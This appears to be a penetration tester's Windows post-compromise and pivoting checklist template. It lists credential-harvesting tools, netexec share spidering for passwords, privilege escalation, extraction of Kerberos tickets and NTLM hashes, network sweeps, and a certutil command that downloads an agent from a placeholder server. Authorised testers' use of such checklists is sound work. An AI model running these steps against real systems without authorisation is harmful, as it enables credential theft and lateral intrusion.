# üõ°Ô∏è Host Post-Compromise & Pivoting Checklist (Template)

**Copy & paste this into each host folder before starting work.**

---

## 1) Initial Checks
- [ ] Check current user privileges with `whoami /all`

```powershell
whoami /all
```
- [ ] Note if the host is domain-joined
- [ ] Identify machine role (workstation, server, DC, etc.)

---

## 2) Scraping for Credentials (IMPORTANT)
Scrape the host for credentials using these tools/scripts:

- [ ] `LaZagne`
- [ ] `Snaffler`
- [ ] Look for others **(FIND THE MOST YOU CAN AND THE BEST SCRIPTS)**

**If the host is domain-joined, re-check access on `SMB`, `FTP`, `SMTP`, `RPC`, `IMAP`, etc. with `netexec`:**

```bash
# netexec examples
nxc smb <target> --shares
nxc smb <target> --spider <sharefolder> --pattern "pass"
nxc smb <target> -M spider_plus
```

---

## 3) Privilege Escalation
If none of the above yields local admin creds, perform PrivEsc:

- Run `JAWS`, `WinPEAS` to check for privilege escalation vectors
- Abuse viable findings to obtain `NT AUTHORITY\SYSTEM`

### UAC, LAPS, Defender
- [ ] UAC status checked
- [ ] LAPS presence/status checked
- [ ] Defender status/exclusions checked

---

## 4) Loot (Post-Compromise)
- [ ] Extract cached Kerberos tickets and NTLM hashes
- [ ] Document findings:
  - `commands.md` ‚Äî commands used
  - `finding.md` ‚Äî what/why/how + impact + caption
  - `evidence.md` ‚Äî screenshots / proof
- [ ] Collect all creds into `host/loot/creds.md` (Obsidian)

---

## 5) Pivoting to Internal Network
- [ ] Run `hostname` and `ipconfig` to understand the purpose of the host

```powershell
hostname
ipconfig /all
```

- [ ] Ping sweep the subnet the host is in (from Linux or approved tools)

```bash
# from Linux (examples ‚Äî adjust subnet and tooling to your ROE)
nmap -sn 172.x.x.0/24
# or
fping -a -g 172.x.x.0/24 2>/dev/null
```

---

## 6) Setting Up a New Pivot
- [ ] Get hostnames of discovered hosts from the Windows host

```powershell
# (add your preferred enumeration commands, e.g.)
arp -a
Get-DnsClientCache
```

> If inbound ping is disabled and hosts don't answer back (firewall blocks ICMP/echo), note alternative discovery to tackle later.

- [ ] Map out the networks by drawing them in your canvas/diagram tool

---

## 7) Set Up a Tunnel
- [ ] Use Ligolo to generate a cert and move it via SMB/HTTP/WMI
- [ ] Try `certutil` where appropriate

```powershell
# example placeholder
certutil -urlcache -split -f http://<your_server>/agent.exe agent.exe
```